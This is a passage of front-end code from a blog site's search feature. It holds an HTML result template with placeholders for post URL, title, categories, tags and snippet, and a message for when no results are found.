pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
